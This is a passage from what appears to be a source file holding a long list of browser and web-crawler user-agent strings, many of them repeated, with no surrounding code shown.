               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
